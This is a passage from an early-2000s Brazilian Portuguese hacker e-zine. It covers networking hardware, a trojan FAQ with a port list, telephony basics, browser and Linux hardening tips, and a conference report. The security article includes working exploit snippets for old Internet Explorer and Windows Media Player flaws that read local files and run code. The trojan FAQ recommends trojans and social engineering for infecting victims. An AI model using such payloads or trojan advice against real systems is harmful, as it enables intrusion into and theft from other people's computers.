modernos  q  ligam  redes  sem  fios(nunca  nem  peguei  num  desses)e  q esteja
devidamente configurado(software) para funcionar na rede.

* Cabos - muita  gente, inclusive eu, fazia  do universo dos cabos  um misterio,
existem varias opcoes de  cabeamento de uma rede,  irei abordar alguns tipos  de
topologias ou tipo de ligacoes de  redes em outra oportunidade, vc pode  usar os
velhos cabos coaxiais q saum  aqueles cabos redondos q ligam  a Tv a cabo ou  vc
pode usar os famosos par  trançado(azuzinho), naum obordarei o uso  dos coaxiais
por q eles jah  estao em total desuso,  o par trançado usa  conectores RJ45 para
fazer as ligacoes dos terminais, cuidado pois muita gente confunde par  trançado
com RJ45,  par trançado  eh o  tipo de  cabo e  RJ45 eh  o conector.  O cabo par
trançado tambem eh  muito utilizado na  telefonia, por ser  muito flexivel e  de
facil manuseio. Existem  algumas limitacoes no  uso desse tipo  de cabo, como  a
distancia maxima de 100M, mas a facilidade no seu uso excede isso. Existem  duas
maneira de se conectar um computador a  uma rede com esse tipo de cabo,  podemos
liga-lo no Pc e depois a  um centralizador(HUB,Switches), ou de um Pc  ao outro,
sendo q as  maneiras de criparmos(colocar  o conector no  cabo) os fios  no cabo
serao diferentes,  existe um  padrao chamado  `furukawa` ou  T586A, q  eh o mais
utilizado  na crimpagem  dos cabos,  pois esse  padrao eh  feito para  ligarmos
terminais ao centralizador, existe ainda outro q eh muito conhecido pelos  manus
por aih,,pois  falta grana  pra comprar  um HUB,  eh o  CrossOver(T586B) q nesse
padrao de crimpagem non eh preciso o uso de um centralizador para interligar  os
terminais, mas infelizmente soh se pode usar  2 Pcs pois soh havera um cabo,  se
quiser acrescentar mas um terminal teria q por mais uma placa de rede no  pc(non
aconselho isso, dah sempre conflito), valhe  a pena salientar q a crimpagem  dos
cabos non passa da  ordenacao dos fios do  cabo no conector, depois  posso falar
mais sobre isso. Com certeza existem outros tipos de cabos por aih, como a fibra
optica mas non irei falar pois non sei nada sobre.

* HUBS - com certeza em redes simples esse centralizador eh muito utilizado, ele
eh disposito eletronico q serve para  fazer uma cadeia de cabos par  trançado, e
respectivamente unir todos  os terminais q  estao ligados a  esses cabos, muitos
pensam q os HUBs saum componetes burros numa rede ou q soh servem pra interligar
os terminais, mas na atualidade existem HUBs q fazem um pouco mais q interligar,
eh atuam como  pontes para outras  partes da rede,  filtram dados, amplificam  o
sinal controlam o  trafego e etc,  com certeza o  uso deles eh  muito popular em
pequenas redes  pelo mais  ou menos  baixo custo,  cerca de  80 pilas,  eh muito
importante tambem atencao na taxa de trafego do HUB se eh compativel com as  das
placas de redes, q  eh 10Mbps ou 100Mbps,  existem alguns q trabalham  com os 2,
vale salientar q se vc  tiver um HUB de 100Mbps  e uma placa de 10Mbps  sua rede
caira para 10Mbps. O HUB por ser um dispositivo meu rude, ao vc enviar um pacote
para deterinado terminal  ao passar pelo  HUB ele envia  esse pacote a  todos na
rede, mas soh eh lido por quem o interessa.

* Switches  - esses  se assemelham  muito aos  HUBs, tambem saum centralizadores
numa rede,  mas oferecem  uma gama  enorme de  opcoes de  trafego gerenciamento,
podem suportar apenas  alguns terminais ou  ateh mesmos redes  enormes inteiras,
olhando a olho nuh pode-se confundir um switch com um HUB, mas internamente eles
saum bem  diferentes, o  switch pode  determinar  a  quem na  sua rede  o pacote
deverah ser entregue, ao enviar um pacote na rede o switch solicita  informacoes
q irão fazer com q o  pacote seja entregue unicamente ao seu  destinatario, naum
causando q outros terminais tambem recebam o pacote mas a frente vou explicar um
pouco mais sobre isso(bem interesante), eles tambem oferecem uma interface com o
usuario facilitando a sua configuracao, com um switch na mao podemos dizer q  se
pode fazer realmente uma festinha  na rede, pode-se criar VLans(redes  virtuais)
dividindo-se o  switch ao  meio(software), entre  outras coisas  q fazem dele um
componente  mais  do  q importante  em  uma  rede o  estudo  do  mesmo eh  muito
importante pros condidatos a fucadores de plantao (como eu):).

* Roteadores - tah  aih uma coisinha q  tambem chama muito a  atencao da galera,
como o proprio nome  diz `roteador`,faz as rotas,  ele serve como  um  guarda de
transito da rede, eh  nele q se faz  a comunicaco  entre 2  redes bem distintas,
nele eh  autorizada a  entrada e  saida de  dados q  naum fazem  parte da  rede,
tambem  eh  um  componete  gerenciavel  e  com  interface  ao  administrador, os
roteadores possuem  sistemas operacionais proprios q trabalham muito numa grande
rede,  com  certeza  em  redes  do  governo  e  grande  empresas  existem muitos
roteadores pois o trafego  das mesmas exige um   gerenciamento fora do local  da
rede, o  topic `roteadores`  eh muito  abrangente levaria  horas pra  explicar o
processo de roteamento, se consegui-se explicar.


::::...That's all Folks

Fico por aki com saudades de Pasárgada!
Continua no proximo episodio.
Abraços a coracaodeleao, inferninh0, bynaryus e todos q me tem no coracao:)hehe





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 19 ]=-=[ FAQ - Trojan ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

O que sao trojans?
^^^^^^^^^^^^^^^^^^
Sao  programas que  quando introduzidos  no computador  da vitima,  permitem ao
atacante executar comandos remotamente no PC da vitima.

Como eles trabalham?
^^^^^^^^^^^^^^^^^^^^
O modo como os trojans trabalham eh conexao cliente/servidor. E esta conexao que
faz com que o atacante posso ter  o controle da maquina da vitima. Esta  conexao
ocorre da seguinte  forma, o trojan  eh composto por  sua parte cliente  e outra
parte que damos o nome de servidor ou server.

O que eh conexao cliente/servidor?
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Como dito acima, e este tipo de conexao a utilizada pelo trojan, independente de
qual for  o trojan.  O cliente  e o  responsavel pela  execuçao dos  comandos no
server, o qual devera estar instalado no computador da vitima. Quando a vitima e
infectada com o server, este server abri uma porta no PC da mesma, e eh  atraves
dessa porta aberta que o cliente se comunicará com o servidor.

Como infectar a vitima?
^^^^^^^^^^^^^^^^^^^^^^^
Ta mais do que na cara, de que  para se infectar o PC de alguem vc  vai precisar
da nossa querida engenharia social. Através dela vc vai consegui fazer com que a
vitima se torne a principal culpada pelo ataque.

Como se previnir?
^^^^^^^^^^^^^^^^^
Nunca aceite  nenhum arquivos  suspeito, principalmente  arquivos com  extensoes
.exe, pelo justo fato de a maioria dos servers possuirem esta extençao. Eh claro
que tem excesoes,  como o server  do NST (Ninja  Spy Trojan) onde  a extensao eh
.scr. Sempre mantenha seu  computador em dia com  relaçao a virus,e se  possivel
pegue o Xô  Bobus, o melhor  em detectaçao e  prevençao contra trojans  na minha
opiniao, ou qualquer outro anti-trojan.

Trojans mais conhecidos:
^^^^^^^^^^^^^^^^^^^^^^^^
--->>> Back Oriffice
--->>> NetBus
--->>> Wincrash
--->>> NST(Ninja Spy Trojan)
--->>> Subseven

OBS.: Na minha  opniao o NetBus  eh o trojan  mais podre da  face da Terra,  ate
minha vo seria capaz de invadir com ele. Minha dica pra quem quise um trojan bom
e o NST e Wincrash, isso na minha opniao.

###############################################################################
Relaçao de portas com seus respectivos trojans:
Abaixo está a lista das portas-padrão utilizadas pelos trojans mais  conhecidos
para Windows NT, 95, 98:

Porta 21 - Blade Runner, Doly Trojan, Fore, Invisible FTP, WebEx, WinCrash
Porta 23 - Tiny Telnet Server
Porta 25 - Antigen, Email  Password Sender, Haebu Coceda, Terminator,  Shtrilitz
Stealth,etc
Porta 31 - Hackers Paradise, Master's Paradise 8
Porta 121 - BO jammerkillahV
Porta 456 - Hackers Paradise
Porta 555 - Ini-Killer, Phase Zero, Stealth Spy
Porta 666 - Satanz Backdoor, Attack FTP
Porta 1001 - Silencer, WebEx
Porta 1011 - Doly Trojan
Porta 1033 - NetSpy
Porta 1080 - Wingate (Socks-Proxy)
Porta 1170 - Psyber Stream Server, Voice, Streaming Audio Trojan
Porta 1234 - Ultors Trojan
Porta 1243 - SubSeven
Porta 1245 - VooDoo Doll
Porta 1492 - FTP99CMP
Porta 1509 - Psyber Streaming Server
Porta 1600 - Shivka-Burka
Porta 1807 - SpySender
Porta 1981 - Shockrave
Porta 1999 - BackDoor
Porta 2001 - Trojan Cow
Porta 2023 - Ripper
Porta 2115 - Bugs
Porta 2140 - Deep Throat, The Invasor
Porta 2565 - Striker
Porta 2583 - WinCrash 2.0
Porta 2801 - Phineas Phucker
Porta 3024 - WinCrash
Porta 3129 - Masters Paradise
Porta 3150 - Deep Throat, The Invasor
Porta 3700 - Portal of Doom
Porta 4590 - ICQTrojan
Porta 4950 - IcqTrojen
Porta 5000 - Sockets de Troie
Porta 5001 - Sockets de Troie
Porta 5321 - Firehotcker
Porta 5400 - Blade Runner
Porta 5401 - Blade Runner
Porta 5402 - Blade Runner
Porta 5569 - Robo-Hack
Porta 5742 - WinCrash
Porta 6400 - The tHing
Porta 6670 - DeepThroat
Porta 6771 - DeepThroat
Porta 6883 - DeltaSource
Porta 6939 - Indoctrination
Porta 6969 - GateCrasher, Priority
Porta 7000 - Remote Grab
Porta 7300 - NetMonitor
Porta 7301 - NetMonitor
Porta 7306 - NetMonitor
Porta 7307 - NetMonitor
Porta 7308 - NetMonitor
Porta 7789 - ICKiller
Porta 9872 - Portal of Doom
Porta 9873 - Portal of Doom
Porta 9874 - Portal of Doom
Porta 9875 - Portal of Doom
Porta 9989 - iNi-Killer
Porta 10067 - Portal of Doom
Porta 10167 - Portal of Doom
Porta 11000 - Senna Spy
Porta 11223 - Progenic trojan
Porta 12223 - Hack´99 KeyLogger
Porta 12345 - GabanBus, NetBus
Porta 12346 - GabanBus, NetBus
Porta 12361 - Whack-a-mole
Porta 12362 - Whack-a-mole
Porta 16969 - Priority
Porta 20001 - Millennium
Porta 20034 - NetBus 2 Pro, NetRex Pro
Porta 21544 - GirlFriend
Porta 22222 - Prosiak 0.47
Porta 23456 - Evil FTP, Ugly FTP, WhackJob
Porta 26274 - Delta
Porta 30029 - AOLTrojan1.1
Porta 30100 - NetSphere
Porta 30303 - Sockets de Troie 2.5
Porta 30999 - Kuang
Porta 31337 - Back Orifice
Porta 31338 - Back Orifice, DeepBO
Porta 31339 - NetSpy DK
Porta 31666 - BOWhack
Porta 31787 - Hack'a'tack
Porta 33333 - Prosiak
Porta 34324 - BigGluck, TN, Tiny Telnet Server
Porta 40412 - The Spy
Porta 40421 - Master's Paradise
Porta 40422 - Master's Paradise
Porta 40423 - Master's Paradise
Porta 40426 - Master's Paradise
Porta 47262 - Delta
Porta 50505 - Sockets de Troie
Porta 50766 - Fore
Porta 53001 - Remote Windows Shutdown
Porta 61466 - Telecommando
Porta 65000 - Devil
###############################################################################

                 LISTA PEGA DO SITE WWW.PROJACK.CJB.NET!!!


Nota final
Espero que tenha gostado do  txt. Eu sei que ta  bem simples mas eh isso  mesmo.
Qquer duvida  soh me  da um  toque, eu  to sempre  nos canais #motd #DMA #phreak
(irc.brasnet.org), e tbm podem me  manda um e-mail, principalmente as  mulheres,
hehehe =] d4rwin@bol.com.br





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 20 ]=-=[ Telefonia ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

========================= # Telefonia # =======================
=========================================
= HazzarD -> hazzard@itelefonica.com.br =
=========================================

===========================================================
=   # 1- Introdução a Telefonia                                                                                          =
=   # 2- História                                                                                                         =
=   # 3- Estrutura                                                                                                                   = 
=   # 4- Comutação                                                                                                    =
=   # 5- Transmissão                                                                                                             =
=   # 6- Energia                                                                                                                     =
=   # 7- Telefonia Móvel                                                                                                         =  
=   # 8- Redes                                                                                                                       =
=   # 9- Finalizando                                                                                                                = 
===========================================================

 
# 1- Introdução
===============

Por  Telecomunicações,  entende-se  a  ciência  e  a  técnica  de  transmissão à
distancia, usando-se recursos baseados em fenômenos elétromagnéticos. São  ramos
das telecomunicações:  telegrafia( transmissão  da palavra  escrita), telefonia(
transmissão da palavra falada), televisão  ( transmissão da imagem), telefoto  (
transmissão da imagem fixa)  e o ramo mais  novo, o teleprocessamento, que  pode
ser  definido como  uma forma  de manipulação  da informação  ou transmissão  de
dados.


# 2- História 
==============  

Os primeiros sistemas de telecomunicações tiveram aplicações em telegrafia.  Foi
no  ano de  1753 que  surgiu o  1º sistema  telegrafico. Era  constituído de  um
gerador de alta tensão localizado numas deas extremidades da conexão e na  outra
ponta existiam diversos terminais em que cada um era representado por uam letra.
Assim, se por exemplo fosse transmitir a letra "A" aplicava-se uma tensão  nesse
terminal. Esse terminal possuia um eletrodo que atraia um pedaço de papel com  a
letra "A". Assim as palavras poderiam ser transmitidas dessa maneira. 

Esquema simplificado para melhor entendimento: 


Gerador  -------------------------------------|eletrodo -> papel com letra "A" 
                                              |eletrodo -> Papel com letra "B" 
                                              |eletrodo -> Papel com letra "C" 
                                              |eletrodo -> Papel com letra "D" 
                                              e por aí vai...
 
Com o passar do tempo cada vez mais a tecnologia foi sendo desenvolvida até  que
em  1876, Grahan  Bell desenvolve  um aparelho  que poderia  transmitor sons.  A
primeira estação de telefonia foi inaugurada em 1879, em Connecticut, EUA.   

No Brasil, o  primero telefone instalado  foi na loja  de aparelhos elétricos  e
mecânicos "O Grande Mágico", no Rio de Janeiro, em 1877.

 
# 3- Estrutura 
===============

                                  Embratel
                                 ----------
                                      |
                      Companhias de telefonia fixa e movel
                      -------------------------------------
                                      | 
                            Rede Telefônica local 
                           -------------------------
                                      |
                          Distrubuidor geral regional 
                         -----------------------------
                                      |
                             Sua linha telefônica
                            ----------------------

 
* Ligações locais -> utiliza-se somente o distribuidor geral

* Ligações Interurbanas -> Distribuidor geral e rede telefônica local

* Ligações Internacionais -> Distribuidor geral, rede telefônica local e Embratel

Obs1: vale também para telefonia movel  
Obs2: todas as ligações saõ feitas por alguma companhia de telefonia movel ou fixa

 
# 4- Comutação
===============

Equipamentos  necessários  à seleção  e  conexão do  caminho  que possibilita  a
comunicação entre usuários quaisquer( os comutadores funcionam como  roteadores,
ou seja, escolhem o melhor caminho de um usuário ao outro).

O  Comutador  compreende os  caminhos  para o  estabelecimento  das conversações
telefonicas.  É  uma  unidade  passiva  e  serve  apenas  para  o  transporte de
sinais(dados).

A  Unidade  de  Controle(UC)  compreende   o  que  podemos  chamar  de   funções
inteligentes da central. É a parte  ativa da central, ou seja, recebe  e analisa
as informações, encaminha e aciona o comutador.

 
# 5- Transmissão 
================    

Conjunto de equipamentos e linhas físicas(OU NÃO) definem uma transmissão. 
Exemplos de transmissões:

* Cabo Coaxial 

 Linha 1 ---> CT UL ---> -------- cabo coaxial --------> CT UL ----> Linha 2

CT = Central Telefonica
UL = Unidade Local 

 
* Enlace de Radio SHF

Linha 1 -> CT UL -> CT UI -> ETT -> microondas -> ETT -> CT UI -> CT UL -> Linha 2 

ETT = Estação de Torre e Transmissão
UI = Unidade Interurnaba

 
* Satélites 

Linha 1 --> CT UL --> CT UI -> ETT -> --- microondas ---> ETT  --> CTD
                                               |
                                               |    
                                               |
                                            Satélite    
                                               |
                                               |
                                               |   
Linha 2 <-- CT UL <-- CT UI <- ETT <--- microondas --- <-- ETT  <-- CTD     

CTD = Central de Transmissão Digital      
 

# 6- Energia
=============

Equipamentos necessários para alimentar elétricamente as partes que compoem o sistema:

* Substação = Provedora da energia elétrica
* Sala de Bateria = Possui fontes de bateria para a alimentação dos Comutadores 
* Fontes de Radio e UC = Alimentação para a Unidade Central e RadioTransmissão


# 7- Sistemas de Telefonia Movel
================================

Hoje  em  dia,  a Telefonia  utiliza  um  canal para  transmissão  e  outro para
recepção, denomidado modo Full-Duplex. 
Cada canal possui 33  faixas que operam na  frequência de 800 a  quase 1000 Mhz,
variando de acordo com celular e operadora. 
Cada torre cobre uma area de raio 80 Km (Aproximadamente 20000 Km) 


# 8 - Redes de Telefonia 
========================

As redes são os tipos de ligações entre as linhas telefônicas

* Rede de Malha
Cada linha esta  ligada com todas  as outras linhas.  Esse tipo de  rede é pouco
utilizada hoje em dia. 

ex:  
A--------B               
| \    / |      
|  \  /  |   
|   \/   | 
|   /\   | 
|  /  \  | 
C-/----\-D

  
Para calcular o numero de linhas nesse tipo de rede utiliza-se a fórmula  
* L=n(n-1)/2 *            

L -> numero de linhas    N= numero de pontas (ex: A,B,C,D)


* Rede Radial 
Todas  as  linhas  são  ligados  á  uma  mesa  operadora,  que  fazem  a correta
distrubuição das ligações
ex:
                                                                                        
A    B    C
 \   |   /
  \  |  /
   \ | /
    \|/ 
     #  

 
* Rede de Assinantes 

A  rede de  assinates é  bem complexa,  formada por  equipamentos destinados  à
interligar todas as linhas à Central Telefonica local.

Componentes:

Distribuidr Geral(DG) :  Todas as linhas  de uma CTL(  central telefonica local)
são ligadas  a um  DG. Os  DGs podem  ter dimensões  realmente grandes,  podendo
chegar a 30 metros de comprimento  por 5 metros de altura. Qualquer  perturbação
elétrica  é  percebida  pelo  DG  e  é  rapidamente  reparada,  graças  ao  seus
dispositivos  de  proteção.  Também  está  no  DG  o  dispositivo  que   permite
desconectar  assinates,  caso  o  mesmo  pessa  cancelamento  ou  ocorra  o  não
pagamento. Cada DG pode suportar centenas ou milahres de assinantes,  dependendo
de sua capacidade.

Tunel  de  cabos(subterrania),  redes  primarias,  redes  secundarias  e   redes
terciárias são utilizadas para interligar os DGs e são chamadas de Rede de Cabos
Troncos

ex:
 

Linha1 --------- DG ---------#----------- DG ---- linha 2 
                 |
                 |
                 |
                 |
linha 3 -------- DG ----------- linha 4 

# Cabos Troncos                       

 

# 9- Finalizando
================

Espero  que  este artigo  sobre  telefonia tenha  ajudad  você a  reconhecer  os
sistemas de telefonia utilizada  nos dias de hoje.  Não quis entrar em  detalhes
sobre telefonia Movel porque o existe uma grande quantidade de textos sobre isso
na internet. Futuramente estarei escrevendo um texto sobre Montagem e Manutenção
de PABX e outro  sobre Trasmissão Digital. Eles  não foram colocados juntos  com
esse texto por falta de tempo. 


Obrigado pela atenção !!! Duvidas? hazzard@itelefonica.com.br


             Atenciosamente   HazzarD     11/10/2003





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 21 ]=-=[ Segurança Digital ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

|=--------------------------=[ InfosHack InSecurity ]=----------------------=|
|=--------------------------------------------------------------------------=|
|=---------------------------=[ Segurança Digital ]=------------------------=|
|=--------------------------------------------------------------------------=|
|=-------------=[ by Inferninho <inferninh0@motdlabs.com.br> ]=-------------=|                           

 
   Se vc anda preocupado com sua segurança na Internet aqui vão algumas dicas de
como  diminuir brechas  no I.E. , como usar proxy para esconder seu IP e de como 
fechar as portas do seu Linux, ai vc vira pra mim e  diz dãããããã como se eu naum 
soubesse fazer  isso, e dai eu digo, bom pra vc, mais tem quem naum sabe mané !! 
E de quebra  algumas  falhas  no I.E. que  um  WebMaster  mal  intecionado  pode 
explorar (Eu juro que nunca fiz isso). Pode até ser contraditorio escrever sobre
como  explorar falhas mais a  intenção e de assustar  pela facilidade que isso e 
possível. Bom  pra  começar vamos  deixar o I.E.  mais  protegidos de ataques, a 
melhor opção seria usar o Netscape mais se vc e fã da Microbost (fazer o que tem
gosto pra tudo nesse mundo) lá vai:

 
Abra o Internet Explorer e faça a sequencia Ferramentas / opções da internet/ 
aba Segurança / Nivel personalizado e siga os passos abaixo.

 
1- Proteja suas senhas,  para evitar  que pessoas mau intencionadas tenha acesso 
   ao seu nome de  usuario(login) e sua  senha, clique em "login anônimo" ou se 
   preferir em "solicitar nome do usuário e senha".

 
2- Cookies,  como  na  verdade  alguns  destes  biscoitinhos  são programas meio 
   camuflados para monitorar suas ações na internet e bom pedir para o navegador
   requisitar confirmação antes de copiar um para seu HD, ou então crie o habito 
   de apagar seus aquivos temporarios da internet periodicamente.
 

3- Softwares instalados automaticamente, outro dia vc encontrou um trojan no seu 
   HD adivinha  como ele apareceu, para naum ficar a mercer dessa eficiente arma 
   hacker , defina em "Permissão de Canais de Softwares" segurança máxima ai seu
   navegador nunca mais vai fazer download de um programa sem o seu conhecimento
 
 
4- Informações  confidencias, se vc naum quer correr o risco de quando for fazer 
   compras on-line ter por exemplo o numero de seu cartão de credito  a mercê de 
   espertinhos vá em "submeter dados de  formulário não criptografados" e clique 
   em "desabilitar".

 
5- Miniaplicativos em Java, bom essa linguagem e vastamente usada na  criação de 
   sites e como e muito maleavel e  flexivel e tb  bastante comum ser vista como 
   forma de vandalismo  digital,  para diminuir  os risco  clique em  "segurança 
   alta" em permissões de java.

 
 6- Scripts e ActiveX, da mesma forma que o Java e bom tomar cuidado com esses ai
   para  isso  habilite a opção  "confirmar" em "scripts e plug-ins" e "controle 
   activeX", assim qualquer ação que envolver seu micro será notificada e pedirá 
   sua aprovação.

 
Mais isso  tudo e mesmo necessário!? Sim senhor! Preste atenção nestas falhas 
do I.E. e vc verá como é possível com simples  linhas atacar qualquer sistema
desprotegido.

 

                                 Falha no I.E. 5.5

   Com essa falha aki e possível ler qualquer arquivo da maquina de desavisados. 
Uma brecha  no Active  scripting permite  isso. Vamos supor  que vc queira ler o 
arquivo c:\hacker.txt vc consegue imaginar isso naum e mesmo???


<html>
<br>
</h2>
<script>
v=new
ActiveXObject("MSSciptControl.ScriptControl.1");
v.Language="VBScript";
x=v.eval('GetObject("c:/hacker.txt","htmlfile")');
setTimeout("alert(x.body.outerHTML);",2000);
</script>
</html> 
 
Bom  na verdade  esse código  só vai  mostrar o arquivo para quem  acessar a 
pagina  em questão (vc naum achou mesmo que eu ia ensinar tudo, achou?) mais se 
vc consegue entender o codigo e só redirecionar o  conteudo para  algum arquivo 
no servidor. 

 

                              Quer mais ? Então Toma ! ! 
 
Essa falha se aproveita de outra falha do Windows  Media Player 7, e é  muito 
pior  que a anterior, é simples  o tocador do  ruindows tem uma função de baixar 
skins  automaticamente ou  seja basta  colocar um  arquivo com  extensão .wmz no 
navegador que o coitado faz o resto. E vc com isso? Bom o conteudo desse arquivo 
pode ser qualquer coisa, hehhehhe, ponha  esse troço que vc tem entre as orelhas 
para  funcionar que vc verá as  inumeras  possibilidades, nesse  exemplo será um 
aplicativo  em Java  que vai ter  acesso a todo  disco rigido com permissão para 
executar qualquer comando no HD, inclusive o deltree. Vamos supor que vc tenha a 
seguinte pagina no seu site, hacker.html coloque nela o seguinte código:


<IFRAME SRC="wmp2.wmz" WIDTH=1 HEIGTH=1></IFRAME>                
<SCRIPT>
function f()
{
window.open("hacker1.html");
}
setTimeout("f()",4000);
</SCRIPT>


No arquivo hacker1.html coloque: 

<APPLET CODEBASE="file://c:/"ARCHIVE="Arquivos de Programas/Windows Media Player
/SKINS/wmp2.wmz" CODE="inferninho.class" WIDTH=700 HEIGHT=300>
<PARAM NAME="URL" VALUE="file:///c:/inferninho.txt">
</APPLET>  


Esse  código baixa  o wmp2.wmz  para o  computador, apos  isso será  aberto o 
hacker1.html o  qual procura  dentro do  wmp2.wmz o  arquivo  inferninho.class o 
lance  todo  esta  aki, esse  arquivo  e  que  vai  executar  o  comando  de sua 
preferencia,  que  eu naum  vou ensinar  como faz , pelo  simples fato que essas 
coisas  são uma faca  de dois  legumes (é isso mesmo!?, bom naum  importa) o que 
quero dizer e que naum quero que isso vire o paraiso de Lamers, mais se vc  esta 
prestando atenção vai perceber como  e facil, lembre-se que esse aquivo pode ser 
qualquer coisa.

Bom ja fugimos demais do assunto voltemos então: 


7- Patches de  segurança  e Firewall, para  corrigir essas  falhas use o Windows 
   Update, é akilo lá serve pra  alguma  coisa sim, ele vai direcionar vc para a 
   pag. da  Microbost e  sugerir que vc baixe algumas correções ai e so esperar, 
   bom se vc nunca fez isso  vai  esperar  muito  o windows  e cheio de buracos. 
   Instale tb um Firewall, sugiro  o ZoneAlarme que e de gratis e é o suficiente 
   para manter Lamers afastados, e  os hackers  como me livro deles? Bom a menos 
   que  vc seja um  Milhonario nenhum  deles  vai se  interessar  em invadir seu 
   computador o esforço naum vale apena a naum ser que isso lhe dê algum prazer, 
   por exemplo vingança ou pura sacanagem mesmo, uahuahuahuah. 

 
Sobre  o que  mais eu  ia escrever  mesmo???  (Vou  subir  a  tela  pra ver a 
introdução, espera  ai, ja  que  eu  volto!). Ah  tá! Navegar  anonimamente  com 
endereço  de  proxy ! Se vc naum sabe  o que é um proxy, vai ficar sem saber por 
que eu naum tô afim de escrever sobre. Mais como eu uso um, Inferninho? Pra usar 
um, é simples, primeiro vc procura neste site um lugar onde ta escrito Endereços 
de Proxys ou  qualquer  coisa  parecida  e pra  tá no menu da esquerda, se esses 
Proxys naum estiverem  funcionando  e só mandar um  Cólera do Dragão no Haze que 
ele atualiza a lista. O endereço deve ser algo assim 123.45.67.89:80 obs.: que o 
endereço e somente 123.45.67.89 esse tal de :80 e o numero da porta. 

Agora e so configurar o Navegador, para o I.E. use essa sequencia:

Ferramentas/ Opções  da  Internet/ Conexões/ botão  Configuração  de LAN/ Marque 
a opção  usar servidor  proxy para  rede local/ no  endereço  digite o  proxy no 
nosso caso 123.45.67.89/ e embaixo a porta que e 80 sem os ":" pelo amor de Deus
, ai e so dar OK/ Aplicar/ OK. 
 
 
Para o Netscape faça assim: 

Edit/ Preferences/ Advanced/ Proxies / Marque a opção Manual proxy configuration
/ Em HTTP Proxy digite o  endereço do  proxy / Em Port, digite  a porta do proxy 
dããããããã / OK.
 
Ah  tá ! então  vc usa Linux  e esta  acima de tudo hehehe !!! De fato isso e 
quase  verdade, digo quase porque nem mesmo o Linux consegue escapar das mãos de 
usuarios  menos experientes, um "problema"  para quem usa  Linux e que a maioria 
das  distribuições  disponibilizam  um  conjunto de serviços  que são executados 
assim  que  vc  liga  seu  micro, alguns  destes serviços  podem ser  executados 
automaticamente durante a conexão com a internet por exemplo um servidor Web. Ai 
seu sistema fica com portas abertas e vulnerável, pra invadir ele e so passar um 
port scan e  tentar um telnet  ou rodar um  exploit, e vc  ainda vai ficar aí se 
perguntando como? por que? comigo naum!!! Ou vai  fechar de vez  essas maleditas 
portas (Italiano em homenagem a novela Esperança!!! Credo, acho  que endoidei de 
vez). Então  execute o  seguinte  comando como  "root", "# ntsysv --level 35" se 
aparecer  uma  telinha  azul vc  ta no caminho  certo  garoto  esperto! Todos os 
serviços marcados com "*" serão inicializado junto com o  sistema, para alternar 
entre a inicialização ou naum, pressione a barra de  espaço, se vc naum sabe pra 
que serve  akele serviço  tecle F1 com o  cursor sobre seu nome que vai aparecer 
uma tela explicativa, nunca habilite um programa a menos que vc tenha certeza do 
seu uso, isso poderá evitar muitos problemas, para sair aperte TAB e escolha OK, 
pronto so isso mané !!! 

 
   Ae tem o basicão o resto é com vc pikachu, se vira ki tu naum nasceu umbigado 
comigo, falow ! ! 


*************************
 The MOTD Hacking Group
 Writted by Inferninho 
*************************

|--------------------------------=[ EOF ]=----------------------------------=|





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 22 ]=-=[ MOTD na Conisli - Nós Fomos, Nós Participamos ]=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Como vai galera? Fuçando muito?
 
Reservo esta seção  seção em especial  para divulgar a  vocês que o  1º Conisli 
- Congresso Internacional do Software Livre -  que foi realizado nos dias 8 e  9
na USP-SP teve  a participação do  grupo MOTD. Isso  mesmo! Esse grupo  cheio de
Newbies teve alguns representantes na seção "Mesa de Discussão sobre Hackerismo"
onde foi discutido sobre  o verdadeiro hacking junto  com o hacking ético  (sim,
são sinônimos). Junto com o  MOTD estavam presentes também integrantes  do grupo
CdM - Clube dos Mercenários -, do FTS  - Front The Scene -, e do Fusion  - Recém
criado.

E são eles  quem compareceram na  mesa de discussão:  IP_FIX (motd), Sefer_Zohar
(fusion),  dmr  (fts),  dum_dum  (fts   e  cdm)  e  Inferninh0  (motd).   Embora
praticamente  todos fazem  parte de  todos os  grupos citados.  Com esse  grupo,
levamos o  underground no  topo (entenderam?  underground no  topo! hahaha.  Sem
graça.) para mostrar ao público que estava assistindo (uma sala cheinha) que  os
hackers não são criminosos digitais, lamers, kiddies, etc... Bom, tentamos levar
ao topo, claro que nunca conseguiremos satisfazer a todos, mas a grande  maioria
sim. 

Vamos lá galera!!! White Hat na cabeça!!! Temos que colocar esse chapéu e darmos
a cara à tapa se  quisermos mudar essa imagem negativa  que a mídia tem de  nós.
Lembrando que o  Conisli foi a  nossa primeira aparição  e isso serviu  para dar
partida para  próximas que  já estão  agendadas (agendadas,  não confirmadas)  e
contamos com o apoio  de todos. Nada é  impossível, só depende de  você. Se você
acredita que pode mudar, vai lá! Vai lá lutar pelo o que você acredita com todas
suas forças e com o mais  importante: Um grupo (amigos). Um jovem  não conseguiu
derrubar  a  ditadura  lutando  com  tudo  que  tinha,  mas  milhares  de jovens
derrubaram essa "elite" que só nos fez sofrer (nossos pais e mães).

Com o hacking não é diferente. O  mais forte (mídia, ricos e micro$oft) impõe  o
que é certo  e errado sem  dar espaço para  uma defesa justa.  Então cabe a nós,
